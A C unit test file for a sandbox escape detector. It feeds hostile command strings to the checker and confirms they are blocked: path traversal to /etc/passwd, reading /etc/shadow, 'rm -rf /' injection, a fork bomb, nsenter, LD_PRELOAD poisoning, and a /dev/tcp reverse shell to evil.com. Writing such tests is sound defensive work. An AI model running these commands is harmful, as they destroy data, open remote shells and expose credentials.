/*
 * test_sandbox_escape.c — O14: Sandbox escape detection tests.
 *
 * Tests: init, enable/disable, add_pattern, check command string,
 * check_path, edge cases with len parameter, stats counters.
 */
#include "hermes_sandbox.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int passed = 0, failed = 0;

#define TEST(name, expr) do { \
    if (expr) { passed++; printf("  PASS: %s\n", name); } \
    else { failed++; printf("  FAIL: %s (line %d)\n", name, __LINE__); } \
} while(0)

static void test_init_and_state(void) {
    sandbox_escape_init();
    TEST("init: escape enabled by default", sandbox_escape_is_enabled());
    TEST("init: blocked count starts at 0", sandbox_escape_blocked_count() == 0);
    TEST("init: attempt count starts at 0", sandbox_escape_attempt_count() == 0);

    sandbox_escape_enable(false);
    TEST("disable: escape disabled", !sandbox_escape_is_enabled());

    sandbox_escape_enable(true);
    TEST("re-enable: escape enabled", sandbox_escape_is_enabled());
}

static void test_check_clean(void) {
    sandbox_escape_init();
    sandbox_escape_result_t r = sandbox_escape_check("echo hello", -1, "terminal");
    TEST("clean cmd: not blocked", !r.blocked);
    TEST("clean cmd: reason empty", r.reason[0] == '\0');
}

static void test_check_path_traversal(void) {
    sandbox_escape_init();
    sandbox_escape_result_t r = sandbox_escape_check("../etc/passwd", -1, "terminal");
    TEST("path traversal ../: blocked", r.blocked);
    TEST("path traversal ../: has reason", r.reason[0] != '\0');
}

static void test_check_sensitive_path(void) {
    sandbox_escape_init();
    sandbox_escape_result_t r = sandbox_escape_check("cat /etc/shadow", -1, "terminal");
    TEST("sensitive /etc/shadow: blocked", r.blocked);
}

static void test_check_shell_injection(void) {
    sandbox_escape_init();
    sandbox_escape_result_t r1 = sandbox_escape_check("cmd; rm -rf /", -1, "terminal");
    TEST("semicolon injection: blocked", r1.blocked);

    sandbox_escape_result_t r2 = sandbox_escape_check("echo `id`", -1, "terminal");
    TEST("backtick injection: blocked", r2.blocked);

    sandbox_escape_result_t r3 = sandbox_escape_check("echo $(whoami)", -1, "terminal");
    TEST("subshell injection: blocked", r3.blocked);
}

static void test_check_fork_bomb(void) {
    sandbox_escape_init();
    sandbox_escape_result_t r = sandbox_escape_check(":(){ :|:& };:", -1, "terminal");
    TEST("fork bomb: blocked", r.blocked);
}

static void test_check_escape_cmd(void) {
    sandbox_escape_init();
    sandbox_escape_result_t r = sandbox_escape_check("docker run --rm -it ubuntu bash", -1, "terminal");
    TEST("docker run: blocked", r.blocked);

    sandbox_escape_result_t r2 = sandbox_escape_check("nsenter --target 1 --mount", -1, "terminal");
    TEST("nsenter: blocked", r2.blocked);
}

static void test_check_env_poison(void) {
    sandbox_escape_init();
    sandbox_escape_result_t r = sandbox_escape_check("LD_PRELOAD=./evil.so ./program", -1, "terminal");
    TEST("LD_PRELOAD: blocked", r.blocked);
}

static void test_check_proc_sys(void) {
    sandbox_escape_init();
    sandbox_escape_result_t r = sandbox_escape_check("cat /proc/1/environ", -1, "terminal");
    TEST("/proc/ access: blocked", r.blocked);
}

static void test_check_net_escape(void) {
    sandbox_escape_init();
    sandbox_escape_result_t r = sandbox_escape_check("bash -i >& /dev/tcp/evil.com/4444 0>&1", -1, "terminal");
    TEST("reverse shell /dev/tcp: blocked", r.blocked);
}

static void test_check_len_param(void) {
    sandbox_escape_init();
    /* Check with positive len (should search only first N chars) */
    sandbox_escape_result_t r = sandbox_escape_check("echo ../safe", 4, "terminal");
    TEST("len=4 on ../safe: not blocked (only 'echo' checked)", !r.blocked);

    sandbox_escape_result_t r2 = sandbox_escape_check("../safe", -1, "terminal");
    TEST("full ../safe: blocked", r2.blocked);
}

static void test_check_path_deep_traversal(void) {
    sandbox_escape_init();
    /* sandbox_escape_check_path catches deep path traversal */
    sandbox_escape_result_t r = sandbox_escape_check_path("../../etc/passwd", "file");
    TEST("check_path deep traversal: blocked", r.blocked);
}

static void test_add_custom_pattern(void) {
    sandbox_escape_init();
    bool added = sandbox_escape_add_pattern("EVIL_PATTERN", "custom pattern test");
    TEST("add custom pattern: return true", added);

    sandbox_escape_result_t r = sandbox_escape_check("run EVIL_PATTERN now", -1, "terminal");
    TEST("custom pattern match: blocked", r.blocked);

    sandbox_escape_result_t r2 = sandbox_escape_check("safe command", -1, "terminal");
    TEST("custom pattern no-match: not blocked", !r2.blocked);
}

static void test_check_disabled(void) {
    sandbox_escape_init();
    sandbox_escape_enable(false);
    sandbox_escape_result_t r = sandbox_escape_check("../etc/passwd", -1, "terminal");
    TEST("disabled: not blocked even for ../etc/passwd", !r.blocked);
    sandbox_escape_enable(true);
}

static void test_check_null_inputs(void) {
    sandbox_escape_init();
    sandbox_escape_result_t r1 = sandbox_escape_check(NULL, -1, "terminal");
    TEST("NULL cmd: not blocked", !r1.blocked);

    sandbox_escape_result_t r2 = sandbox_escape_check("", -1, "terminal");
    TEST("empty cmd: not blocked", !r2.blocked);

    sandbox_escape_result_t r3 = sandbox_escape_check_path(NULL, "file");
    TEST("NULL path: not blocked", !r3.blocked);
}

static void test_stats_counting(void) {
    sandbox_escape_init();
    int prev_blocked = sandbox_escape_blocked_count();
    int prev_attempts = sandbox_escape_attempt_count();

    sandbox_escape_check("echo clean", -1, "terminal");
    TEST("stats: attempt incremented on clean", sandbox_escape_attempt_count() == prev_attempts + 1);

    sandbox_escape_check("../etc/passwd", -1, "terminal");
    TEST("stats: blocked incremented on hit", sandbox_escape_blocked_count() == prev_blocked + 1);
}

int main(void) {
    printf("=== Sandbox Escape Detection Tests ===\n");

    printf("--- Init & State ---\n");
    test_init_and_state();

    printf("--- Clean Commands ---\n");
    test_check_clean();

    printf("--- Escape Pattern Detection ---\n");
    test_check_path_traversal();
    test_check_sensitive_path();
    test_check_shell_injection();
    test_check_fork_bomb();
    test_check_escape_cmd();
    test_check_env_poison();
    test_check_proc_sys();
    test_check_net_escape();

    printf("--- Len Parameter ---\n");
    test_check_len_param();

    printf("--- Path Check ---\n");
    test_check_path_deep_traversal();

    printf("--- Custom Patterns ---\n");
    test_add_custom_pattern();

    printf("--- Edge Cases ---\n");
    test_check_disabled();
    test_check_null_inputs();
    test_stats_counting();

    printf("\n%d passed, %d failed\n", passed, failed);
    return failed > 0 ? 1 : 0;
}
